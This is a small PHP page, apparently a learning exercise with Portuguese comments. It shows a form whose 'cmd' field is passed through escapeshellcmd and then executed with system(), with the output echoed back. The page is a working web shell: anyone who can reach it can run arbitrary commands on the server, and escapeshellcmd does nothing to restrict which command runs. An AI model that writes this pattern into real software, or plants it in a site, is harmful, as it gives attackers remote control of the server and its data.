<?php 

if ($_SERVER["REQUEST_METHOD"] === "POST") {
	// variavel cmd recebe o name do input
	$cmd = escapeshellcmd($_POST["cmd"]);

	var_dump($cmd);

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";

}

 ?>
 <form method="post">
 	
 	<input type="text" name="cmd">
 	<button type="submit">Enviar</button>

 </form>